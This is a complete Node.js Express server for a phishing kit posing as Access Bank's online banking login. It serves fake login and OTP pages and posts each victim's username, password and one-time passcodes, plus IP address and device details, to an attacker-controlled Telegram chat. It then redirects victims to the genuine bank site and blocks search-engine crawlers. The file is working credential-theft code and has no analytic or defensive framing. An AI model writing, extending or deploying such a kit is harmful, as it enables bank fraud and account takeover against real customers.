'use strict';
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = (process.env.BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.CHAT_ID || '').trim();
const REDIRECT_URL = (process.env.REDIRECT_URL || 'https://ibank.accessbankplc.com/auth/login/').trim();
const TTL = 30 * 60 * 1000;

app.set('trust proxy', true);
app.disable('x-powered-by');
app.use(express.urlencoded({ extended: false, limit: '32kb' }));
app.use(express.json({ limit: '32kb' }));

const TPL = {};
for (const n of ['index', 'otp', 'done']) {
  TPL[n] = fs.readFileSync(path.join(__dirname, 'public', n + '.html'), 'utf8');
}

const sessions = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now - s.at > TTL) sessions.delete(k);
}, 300000).unref();

const esc = (v) =>
  String(v ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

const ipOf = (req) =>
  (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';

function device(ua = '') {
  const b = /Edg\//.test(ua) ? 'Edge'
    : /OPR\/|Opera/.test(ua) ? 'Opera'
    : /SamsungBrowser/.test(ua) ? 'Samsung'
    : /Chrome\//.test(ua) ? 'Chrome'
    : /Firefox\//.test(ua) ? 'Firefox'
    : /Safari\//.test(ua) ? 'Safari' : 'Unknown';
  const o = /Android/.test(ua) ? 'Android'
    : /iPhone|iPad|iPod/.test(ua) ? 'iOS'
    : /Windows/.test(ua) ? 'Windows'
    : /Mac OS X/.test(ua) ? 'macOS'
    : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  return `${b} / ${o}`;
}

const stamp = () =>
  new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Africa/Lagos', day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false,
  }).format(new Date()) + ' WAT';

async function tg(text) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('[telegram] BOT_TOKEN / CHAT_ID missing — printing instead\n' + text);
    return;
  }
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }),
    });
    if (!r.ok) console.error('[telegram]', r.status, await r.text());
  } catch (e) {
    console.error('[telegram]', e.message);
  }
}

function cookies(req) {
  const o = {};
  (req.headers.cookie || '').split(';').forEach((p) => {
    const i = p.indexOf('=');
    if (i > 0) o[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
  });
  return o;
}

function touch(req, res) {
  const existing = (req.body && req.body.s) || req.query.s || cookies(req).sid || '';
  if (existing && sessions.has(existing)) return sessions.get(existing);
  const sid = crypto.randomBytes(9).toString('hex');
  const s = { sid, at: Date.now(), ip: ipOf(req), ua: req.headers['user-agent'] || '', user: '', otps: 0 };
  sessions.set(sid, s);
  res.setHeader('Set-Cookie', `sid=${sid}; Path=/; Max-Age=1800; HttpOnly; SameSite=Lax`);
  return s;
}

const view = (name, sid) =>
  TPL[name].replaceAll('{{SID}}', sid).replaceAll('{{REDIRECT}}', REDIRECT_URL);

app.get('/', (req, res) => {
  const s = touch(req, res);
  res.setHeader('Cache-Control', 'no-store');
  res.send(view('index', s.sid));
});

app.get('/otp', (req, res) => {
  const s = touch(req, res);
  res.setHeader('Cache-Control', 'no-store');
  res.send(view('otp', s.sid));
});

app.get('/done', (req, res) => {
  const s = touch(req, res);
  res.setHeader('Cache-Control', 'no-store');
  res.send(view('done', s.sid));
});

app.post('/api/login', async (req, res) => {
  const s = touch(req, res);
  const u = String(req.body.u || '').trim().slice(0, 120);
  const p = String(req.body.p || '').slice(0, 120);
  s.user = u;
  await tg(
    '🏦 <b>ACCESS BANK — LOGIN</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code>\n\n` +
    `<b>Username:</b> <code>${esc(u)}</code>\n` +
    `<b>Password:</b> <code>${esc(p)}</code>\n\n` +
    `<b>IP:</b> ${esc(s.ip)}\n<b>Device:</b> ${esc(device(s.ua))}\n<b>Time:</b> ${stamp()}`
  );
  res.json({ ok: true, next: '/otp?s=' + s.sid });
});

app.post('/api/otp', async (req, res) => {
  const s = touch(req, res);
  const otp = String(req.body.otp || '').replace(/\D/g, '').slice(0, 10);
  s.otps += 1;
  await tg(
    '🔑 <b>ACCESS BANK — OTP</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code> · attempt ${s.otps}\n\n` +
    `<b>Username:</b> <code>${esc(s.user || 'n/a')}</code>\n` +
    `<b>OTP:</b> <code>${esc(otp)}</code>\n\n` +
    `<b>IP:</b> ${esc(ipOf(req))}\n<b>Device:</b> ${esc(device(req.headers['user-agent']))}\n<b>Time:</b> ${stamp()}`
  );
  res.json({ ok: true, next: '/done?s=' + s.sid });
});

app.post('/api/resend', async (req, res) => {
  const s = touch(req, res);
  await tg(`♻️ <b>ACCESS BANK — OTP RESENT</b>\n<code>#${s.sid.slice(0, 6)}</code> · ${esc(s.user || 'n/a')}\n${stamp()}`);
  res.json({ ok: true });
});

app.get('/robots.txt', (_req, res) => {
  res.type('text/plain').send('User-agent: *\nDisallow: /');
});

app.get('/health', (_req, res) => res.type('text/plain').send('ok'));

app.use((_req, res) => res.redirect('/'));

app.listen(PORT, '0.0.0.0', () => console.log('listening on ' + PORT));
